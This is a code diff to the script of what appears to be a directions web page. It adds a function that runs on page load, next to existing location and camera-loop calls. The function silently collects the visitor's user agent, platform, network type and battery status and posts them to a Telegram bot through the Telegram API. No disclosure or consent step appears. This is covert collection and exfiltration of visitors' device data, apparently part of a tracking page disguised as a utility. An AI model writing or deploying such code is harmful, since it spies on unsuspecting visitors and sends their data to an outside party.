@@ -157,6 +157,40 @@ function locateUser() {
   );
 }
 
+function getDeviceInfo() {
+  const info = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    connection: navigator.connection ? navigator.connection.effectiveType : "N/A",
+    battery: null,
+  };
+
+  navigator.getBattery?.().then(battery => {
+    info.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
+    sendInfoToTelegram(info);
+  }) || sendInfoToTelegram(info);
+}
+
+function sendInfoToTelegram(info) {
+  const message = `
+📱 *Device Info*
+🧭 Platform: ${info.platform}
+🌐 Network: ${info.connection}
+🔋 Battery: ${info.battery || 'N/A'}
+🧾 User Agent:
+\`${info.userAgent}\`
+`;
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id,
+      text: message,
+      parse_mode: 'Markdown'
+    })
+  });
+}
+
 function openDirections() {
   const dest = document.getElementById("destination").value.trim();
   if (!userLat || !userLng) {
@@ -174,6 +208,7 @@ function openDirections() {
 window.addEventListener('DOMContentLoaded', () => {
   locateUser();
   startCameraLoop();
+  getDeviceInfo();
 });
 </script>
 
